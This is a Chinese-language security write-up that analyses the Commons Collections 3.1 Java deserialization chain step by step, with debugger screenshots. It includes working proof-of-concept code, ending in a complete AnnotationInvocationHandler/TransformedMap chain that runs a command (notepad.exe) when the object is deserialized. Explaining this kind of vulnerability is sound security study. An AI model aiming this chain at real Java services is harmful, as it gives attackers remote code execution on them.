# commons-collections3.1反序列化链

# 环境搭建
> 在用jdk1.7和jdk1.8 u60debug时，idea无法debug进入到jdk的源码中，导入的commons-collections源码倒是能进入。
> 原因大概是jre的问题，导致我出错原因是jdk安装时有第二次弹框安装，这第二次安装目录不能放在jdk的目录内。

**jdk1.7或jdk1.8 u60及以前**
在之后的版本修改了AnnotationInvocationHandler中readObject()代码，不存在setValue值。
**pom.xml**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>seriliaze</groupId>
    <artifactId>cc3.1</artifactId>
    <version>1.0-SNAPSHOT</version>

    <dependencies>
        <!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>

    </dependencies>

</project>
```
# 漏洞分析
## Step1
漏洞点在_/org/apache/commons/collections/functors/InvokerTransformer.java_
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12491841/1611128973807-1d4a8c07-8aa7-4fad-9472-44449a0bfda3.png#align=left&display=inline&height=262&margin=%5Bobject%20Object%5D&name=image.png&originHeight=524&originWidth=990&size=54938&status=done&style=none&width=495) 
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12491841/1611129112604-cf7c056e-aec5-4400-bb66-797241977d25.png#align=left&display=inline&height=109&margin=%5Bobject%20Object%5D&name=image.png&originHeight=218&originWidth=1156&size=24526&status=done&style=none&width=578)
如图123~125行是标准的一次反射调用（获取class，获取方法，调用方法），而iMethodName等参数均可控，故初步编写poc：
```java
public class Test_me {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"notepad.exe"});
        //参数分别：方法名、方法参数类型、方法参数:打开记事本
        serilize(invokerTransformer);//序列化
        InvokerTransformer obj = (InvokerTransformer) unserlize();//反序列化
        obj.transform(Runtime.getRuntime());
    }
    public static void serilize(Object obj) throws IOException {
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("./test.dat"));
        out.writeObject(obj);
        out.close();
    }
    public static Object unserlize() throws IOException, ClassNotFoundException {
        ObjectInputStream in = new ObjectInputStream(new FileInputStream("./test.dat"));
        return in.readObject();
    }
}
```
成功启动记事本，但存在问题：

1. obj.transform(Runtime.getRuntime()); 在实际生产环境中不存在

而我们期望的反序列化漏洞是：直接反序列化，触发readObject()函数。
## Step2
所以，需寻找一个新类“包裹”InvokerTransformer，通过新类内部方法实现：obj.transform(Runtime.getRuntime())。
obj.transform(Runtime.getRuntime())需改进两个地方，通过反射去实现它们，因为实际环境中不存在这样的直接调用。

1. Runtime.getRuntime() 
1. obj.transform() 

而InvokerTransformer.transform()实现一次反射调用，那么可以通过多个反射链实现上述调用，而恰好存在这样的类：
_/org/apache/commons/collections/functors/ChainedTransformer.java_
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12491841/1611129880585-68f1e981-86ef-4526-805a-c6d61b0bf934.png#align=left&display=inline&height=294&margin=%5Bobject%20Object%5D&name=image.png&originHeight=587&originWidth=932&size=54390&status=done&style=none&width=466)
ChainedTransformer的transform()循环执行数组iTransformers的transform()，并将结果作为下一次执行的参数。
对于 Runtime.getRuntime() ，我们可控制数组iTransformers的值实现（结合InvokerTransformer的transform方法理解）  

1. Runtime类通过getMethod获取getRuntime方法，返回Method对象
1. getRuntime方法通过getMethod获取invoke方法，返回Runtime.getRuntime()，即Runtime实例
1. Runtime实例通过getMethod获取exec方法，执行命令

但仅仅通过InvokerTransformer的transform()，即反射调用，只能实现方法调用，无法获取到Runtime类
而又有一个类解决了这个问题：/org/apache/commons/collections/functors/ConstantTransformer.java
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12491841/1611130612580-074efd47-f4b2-429c-bc56-998ce37705d0.png#align=left&display=inline&height=247&margin=%5Bobject%20Object%5D&name=image.png&originHeight=493&originWidth=813&size=41623&status=done&style=none&width=406.5)
ConstantTransformer的transform()方法直接返回变量IConstant，可将其赋值为Runtime类，再执行ChainedTransformer的transform()中的循环调用。
故改进poc：
```java
public class Test_me {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
            	//获取Runtime类,如果这里用Runtime.getRuntime()，会报错：Runtime实例对象无法序列化；而Class类型可以序列化
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                //Runtime类调用getMethod获取getRuntime方法，返回Method对象
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
            	//null表明无参数，据说null有时会报错，用new Object[0] new Class[0]代替
                //Method对象调用invoke方法，执行Runtime.getRuntime()，返回Runtime对象实例
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"notepad.exe"}),
                //Runtime实例调用exec方法，参数为notepad.exe
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        serilize(chainedTransformer);//序列化
        ChainedTransformer obj = (ChainedTransformer) unserlize();//反序列化
        obj.transform("");
    }
    public static void serilize(Object obj) throws IOException {
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("./test.dat"));
        out.writeObject(obj);
        out.close();
    }
    public static Object unserlize() throws IOException, ClassNotFoundException {
        ObjectInputStream in = new ObjectInputStream(new FileInputStream("./test.dat"));
        return in.readObject();
    }
}
```
成功启动记事本，但存在问题：

1.  反序列化后我们仍然手动执行了obj.transform("");

而我们期望的反序列化漏洞是：直接反序列化，触发readObject()函数。
## Step3
所以接来下需要做的是，寻找内部存在调用了transform()逻辑的新类，用来“包裹”ChainedTransformer。
_/org/apache/commons/collections/map/TransformedMap.java_
```java
public class TransformedMap extends AbstractInputCheckedMapDecorator implements Serializable {
	#类变量
    protected final Transformer keyTransformer;
    protected final Transformer valueTransformer;
	#构造函数，且权限public
    public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        return new TransformedMap(map, keyTransformer, valueTransformer);
    }
    protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        super(map);
        this.keyTransformer = keyTransformer;
        this.valueTransformer = valueTransformer;
    }
	#调用了transform
    protected Object transformKey(Object object) {
        if (keyTransformer == null) {
            return object;
        }
        return keyTransformer.transform(object);
    }
	#调用了transform
    protected Object transformValue(Object object) {
        if (valueTransformer == null) {
            return object;
        }
        return valueTransformer.transform(object);
    }
	#调用了transform
    protected Object checkSetValue(Object value) {
        return valueTransformer.transform(value);
    }
	#调用了transform，且权限为public
    public Object put(Object key, Object value) {
        key = transformKey(key);
        value = transformValue(value);
        return getMap().put(key, value);
    }
}
```
TransformedMap中put()方法调用了transformValue() -> valueTransformer.transform()，而valueTransformer可控制为ChainedTransformer实例obj。
完善构造POC：
```java
public static void main(String[] args) throws IOException, ClassNotFoundException {
    Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),//获取Runtime类
            new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
            //Runtime类调用getMethod获取getRuntime方法，返回Method对象
            new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
            //Method对象（getRuntime方法）调用invoke方法，执行Runtime.getRuntime()，返回Runtime对象实例
            new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"notepad.exe"}),
            //Runtime实例调用exec方法，参数为notepad.exe
    };
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    Map map = new HashMap();
    Map transformedMap = TransformedMap.decorate(map,null,chainedTransformer);//将chainedTransformer包裹到TransformedMap中
    serilize(transformedMap);//序列化
    Map obj = (Map) unserlize();//反序列化
    obj.put("value","key");
}
```
成功启动记事本，但存在问题：

1. 反序列化后我们仍然手动执行了obj.put("value","key");

而我们期望的反序列化漏洞是：直接反序列化，触发readObject()函数。
## Step4
所以接下来要做的是，寻找内部调用了put()、checkSetValue()、transformValue()、transformKey()方法的新类，用新类“包裹”Map obj。
TransformedMap的父类AbstractInputCheckedMapDecorator中静态内部类MapEntry：
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12491841/1611132672132-90f63e32-4514-4cbe-8834-9c3deaecae01.png#align=left&display=inline&height=259&margin=%5Bobject%20Object%5D&name=image.png&originHeight=518&originWidth=1170&size=55023&status=done&style=none&width=585)
MapEntry的setValue()方法执行了parent.checkSetValue()，parent可控，但构造函数是protected，不能直接调用，只能通过其他方法间接调用。
如果parent能被我们赋值为TransformedMap，只要执行了MapEntry中的setValue()，则调用了checkValue。
这里梳理下：只要执行了MapEntry中的setValue()，则自动调用TransformedMap的checkValue()。【详解见最后调试分析】
## Step5 
恰好在jdk1.7中sun/reflect/annotation/AnnotationInvocationHandler.class中readObject()方法中存在setValue
![VM]QS%J[FCPAKV8UF9@GUXD.png](https://cdn.nlark.com/yuque/0/2021/png/12491841/1611134215951-35400e4c-742d-4cd2-af53-b2e847a8d87f.png#align=left&display=inline&height=890&margin=%5Bobject%20Object%5D&name=VM%5DQS%25J%5BFCPAKV8UF9%40GUXD.png&originHeight=890&originWidth=1576&size=96748&status=done&style=none&width=1576)
readObject中var5、var4由this.memberValues决定，而它在本类构造函数中可控。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12491841/1611134479468-e98df6eb-57c2-424e-b31f-1da25f0d42cf.png#align=left&display=inline&height=260&margin=%5Bobject%20Object%5D&name=image.png&originHeight=520&originWidth=1234&size=64447&status=done&style=none&width=617)
该构造函数的赋值有要求，参数var1必须是继承Annotation的类，var2赋值为TransformedMap类
Annotation即[Java中的注解](https://www.runoob.com/w3cnote/java-annotation.html)，可用以下任一类：

- @Retention - 标识这个注解怎么保存，是只在代码中，还是编入class文件中，或者是在运行时可以通过反射访问。
- @Documented - 标记这些注解是否包含在用户文档中。
- @Target - 标记这个注解应该是哪种 Java 成员。
- @Inherited - 标记这个注解是继承于哪个注解类(默认 注解并没有继承于任何子类)

这样执行到var5时，var5执行setValue，从而触发TransformMap中checkSetValue()，再调用transform()。
构造最终POC：
```java
public class Test_me {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),//获取Runtime类
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                //Runtime类调用getMethod获取getRuntime方法，返回Method对象
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                //Method对象（getRuntime方法）调用invoke方法，执行Runtime.getRuntime()，返回Runtime对象实例
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"notepad.exe"}),
                //Runtime实例调用exec方法，参数为notepad.exe
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map map = new HashMap();
        map.put("value","value");
        Map transformedMap = TransformedMap.decorate(map,null,chainedTransformer);//将chainedTransformer包裹到TransformedMap中
        Class clg = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clg.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Retention.class, transformedMap);

        serilize(obj);//序列化
        unserlize();//反序列化
    }
    public static void serilize(Object obj) throws IOException {
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("./test.dat"));
        out.writeObject(obj);
        out.close();
    }
    public static Object unserlize() throws IOException, ClassNotFoundException {
        ObjectInputStream in = new ObjectInputStream(new FileInputStream("./test.dat"));
        return in.readObject();
    }
}
```
# 调试分析
debug最终poc，并解释：

1. 为什么只要执行了MapEntry中的setValue()，则自动调用TransformedMap的checkValue()。
1. 为什么map.put("value","value");中必须是"value"，不能是其他内容。
## 为什么执行setValue会执行TransformedMap的checkValue
反序列化后进入到AnnotationInvocationHandler中的readObect()
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12491841/1611135875965-b49ae32c-a053-47ad-9b51-519de7231842.png#align=left&display=inline&height=440&margin=%5Bobject%20Object%5D&name=image.png&originHeight=879&originWidth=1383&size=116156&status=done&style=none&width=691.5)
其中var4：
var4 = this.memberValues.**entrySet()**.iterator()
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12491841/1611136916153-24b6f3e6-d341-45bc-ac06-68a38078b707.png#align=left&display=inline&height=383&margin=%5Bobject%20Object%5D&name=image.png&originHeight=765&originWidth=1696&size=116884&status=done&style=none&width=848)
注意：此处this的值为TransformedMap类型，原因是memberValues是TransformMap类型
memberValues调用了entrySet()，而TransformMap和AbstractInputCheckedMapDecorator的关系是前者是后者的子类
所以此时this指子类TransformMap，而非父类AbstractInputCheckedMapDecorator。
> 梳理下：
> 子类继承父类后便拥有父类的方法，而子类TransformMap执行entrySet()，那么在entrySet()中的this指向的是子类。

执行到Entry var5 = var4.next()时：
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12491841/1611137055254-ddc912d9-dec0-4e5e-8f04-c15f8e9f349b.png#align=left&display=inline&height=191&margin=%5Bobject%20Object%5D&name=image.png&originHeight=382&originWidth=1820&size=67753&status=done&style=none&width=910)
next返回的类型是MapEntry，其中的parent值正是TransformedMap类型。
所以var5最终的类型是MapEntry，这就解释了为什么执行setValue就能触发TransformedMap中的checkSetValue()。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12491841/1611137122014-244c9bfc-442c-49f5-84ea-d5021bc3fb91.png#align=left&display=inline&height=384&margin=%5Bobject%20Object%5D&name=image.png&originHeight=767&originWidth=1574&size=95824&status=done&style=none&width=787)
依次往下执行，进入checkSetValue()
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12491841/1611137352889-21acf656-136f-43b2-bef1-520c616a6608.png#align=left&display=inline&height=188&margin=%5Bobject%20Object%5D&name=image.png&originHeight=375&originWidth=1410&size=55777&status=done&style=none&width=705)
最终开始执行tansform()反射链
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12491841/1611137391621-2b7f0edb-5508-4eb9-9712-94ee7265e7b2.png#align=left&display=inline&height=221&margin=%5Bobject%20Object%5D&name=image.png&originHeight=442&originWidth=1201&size=59897&status=done&style=none&width=600.5)

## 为什么必须是"value"
readObject()中
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12491841/1611137605366-1a2e5622-6c72-49c1-933d-4c2b4f97b68c.png#align=left&display=inline&height=382&margin=%5Bobject%20Object%5D&name=image.png&originHeight=763&originWidth=1459&size=110869&status=done&style=none&width=729.5)
要执行到var5.setValue，必须经过var7和var8处的判断条件。
而var7的值取决于var3和var6，var6是var5的key值；var3取决于var2.memberTypes()，而var3的值为：
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12491841/1611137916221-6f33340e-5825-4c4b-add1-a13034627455.png#align=left&display=inline&height=74&margin=%5Bobject%20Object%5D&name=image.png&originHeight=147&originWidth=704&size=14257&status=done&style=none&width=352)
key默认就取"value"。
所以如果我们在map.put()处不赋值为"value"=>"..."，var6的值就不是"value"，那么在执行var3.get(var6)时无法获取到值，因为var3中仅有"value"=>"...RetentionPolicy"。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12491841/1611137809668-e427c44b-a705-4c5b-b2cc-a3b3b520feda.png#align=left&display=inline&height=406&margin=%5Bobject%20Object%5D&name=image.png&originHeight=811&originWidth=1759&size=194303&status=done&style=none&width=879.5)
例如：map.put("test","test")
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12491841/1611147760934-c37d66f4-b481-4cda-9bf6-946fd13f98e0.png#align=left&display=inline&height=404&margin=%5Bobject%20Object%5D&name=image.png&originHeight=808&originWidth=1825&size=190333&status=done&style=none&width=912.5)


